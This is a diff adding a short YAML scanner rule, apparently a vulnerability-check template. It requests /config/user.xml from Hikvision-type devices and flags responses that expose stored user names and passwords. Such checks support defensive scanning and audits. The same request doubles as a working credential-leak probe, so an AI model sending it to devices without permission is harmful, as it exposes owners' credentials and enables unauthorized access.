@@ -1,0 +1,11 @@
+cve-id: hikvision-infoleak
+rules:
+  - method: GET
+    path: /config/user.xml
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"<user name=\"") && response.body.bcontains(b" password=\"")
+severity:
+  critical
+type: 
+  infoleak
